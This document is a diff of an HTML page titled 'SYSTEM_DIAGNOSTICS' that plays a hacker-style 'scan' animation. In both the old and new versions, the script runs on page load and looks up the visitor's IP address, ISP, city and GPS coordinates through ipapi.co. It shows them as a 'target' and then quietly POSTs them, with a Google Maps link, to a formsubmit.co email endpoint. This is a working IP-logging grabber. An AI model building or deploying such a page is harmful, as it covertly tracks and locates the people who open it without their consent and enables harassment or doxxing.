@@ -1,97 +1,57 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
     <title>SYSTEM_DIAGNOSTICS</title>
     <style>
-        body, html { margin: 0; padding: 0; background: black; color: #00ff00; overflow: hidden; font-family: 'Courier New', monospace; }
-        canvas { position: absolute; top: 0; left: 0; z-index: 1; opacity: 0.2; }
-        .console {
-            position: relative; z-index: 2; padding: 30px; 
-            background: rgba(0, 0, 0, 0.9); border: 1px solid #00ff00; 
-            margin: 40px auto; max-width: 700px; height: 450px; 
-            overflow-y: hidden; box-shadow: 0 0 20px #00ff00;
-        }
-        .line { margin-bottom: 5px; font-size: 14px; text-shadow: 0 0 5px #00ff00; }
-        .blue { color: #00ccff; text-shadow: 0 0 5px #00ccff; }
-        .yellow { color: #ffff00; }
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
+        #console { max-width: 600px; margin: 20px auto; border: 1px solid #0f0; padding: 15px; min-height: 300px; background: #050505; box-shadow: 0 0 15px #0f0; }
+        .line { margin-bottom: 8px; font-size: 14px; }
+        .blue { color: #0cf; }
     </style>
 </head>
 <body>
 
-<canvas id="matrix"></canvas>
-<div class="console" id="console">
-    <div class="line">> [SYSTEM] INITIALIZING_CORE...</div>
-</div>
+<div id="console">> [SYS] INITIALIZING_SCAN...</div>
 
 <script>
-    // 1. MATRIX RAIN
-    const canvas = document.getElementById('matrix');
-    const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-    const letters = "0101010101ABCDEF";
-    const fontSize = 16;
-    const columns = canvas.width / fontSize;
-    const drops = Array(Math.floor(columns)).fill(1);
-    function draw() {
-        ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
-        ctx.fillStyle = "#0F0"; ctx.font = fontSize + "px monospace";
-        for (let i = 0; i < drops.length; i++) {
-            const text = letters[Math.floor(Math.random() * letters.length)];
-            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-            drops[i]++;
-        }
-    }
-    setInterval(draw, 35);
+    var consoleBox = document.getElementById('console');
 
-    // 2. CONSOLE DISPLAY
-    const consoleBox = document.getElementById('console');
-    function addLine(text, type = "") {
-        const div = document.createElement('div');
-        div.className = "line " + type;
-        div.innerText = "> " + text;
+    function log(text, color) {
+        var div = document.createElement('div');
+        div.className = "line";
+        if (color) div.style.color = color;
+        div.innerHTML = "> " + text;
         consoleBox.appendChild(div);
-        consoleBox.scrollTop = consoleBox.scrollHeight;
     }
 
-    // 3. THE DATA PULL
+    // 1. Get Data
     fetch('https://ipapi.co/json/')
-    .then(res => res.json())
-    .then(data => {
-        const sequence = [
-            { t: "BOOTING_NETWORK_SCANNER...", s: 500 },
-            { t: "BYPASSING_LOCAL_FIREWALL...", s: 1200 },
-            { t: "TARGET_IP_FOUND: " + data.ip, s: 2000, c: "blue" },
-            { t: "IDENTIFYING_CARRIER_NODE...", s: 2800 },
-            { t: "ISP: " + data.org, s: 3500, c: "blue" },
-            { t: "TRIANGULATING_GPS_LOCATION...", s: 4200 },
-            { t: "LOC: " + data.city + ", " + data.region, s: 5000, c: "blue" },
-            { t: "COORDS: " + data.latitude + ", " + data.longitude, s: 5800, c: "blue" },
-            { t: "UPLOADING_LOGS_TO_SERVER...", s: 6500 },
-            { t: "SCAN_COMPLETE. TRACE_CLEANED.", s: 7200, c: "yellow" }
-        ];
+    .then(function(res) { return res.json(); })
+    .then(function(data) {
+        
+        // 2. The Slow Reveal
+        setTimeout(function() { log("NODE_FOUND: " + data.ip, "#0cf"); }, 1000);
+        setTimeout(function() { log("ISP: " + data.org, "#0cf"); }, 2000);
+        setTimeout(function() { log("LOCATION: " + data.city + ", " + data.region, "#0cf"); }, 3000);
+        setTimeout(function() { log("GPS: " + data.latitude + ", " + data.longitude, "#0cf"); }, 4000);
+        setTimeout(function() { log("STATUS: LOGGED_TO_REMOTE", "#ff0"); }, 5000);
 
-        sequence.forEach(item => {
-            setTimeout(() => { addLine(item.t, item.c || ""); }, item.s);
-        });
-
-        // 4. THE EMAIL (Wait until scan ends)
-        setTimeout(() => {
+        // 3. Send Email
+        setTimeout(function() {
             fetch("https://formsubmit.co/ajax/jabuvo", {
                 method: "POST",
-                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    _subject: "🎯 TARGET: " + data.ip,
-                    IP: data.ip,
+                    Target: data.ip,
                     ISP: data.org,
-                    Location: data.city,
-                    Maps: "https://www.google.com/maps?q=" + data.latitude + "," + data.longitude
+                    Map: "https://www.google.com/maps?q=" + data.latitude + "," + data.longitude
                 })
             });
-        }, 7500);
+        }, 5500);
     })
-    .catch(err => addLine("ERROR: ACCESS_DENIED", "red"));
+    .catch(function(err) {
+        log("ERROR: CONNECTION_FAILED", "red");
+    });
 </script>
 </body>
 </html>
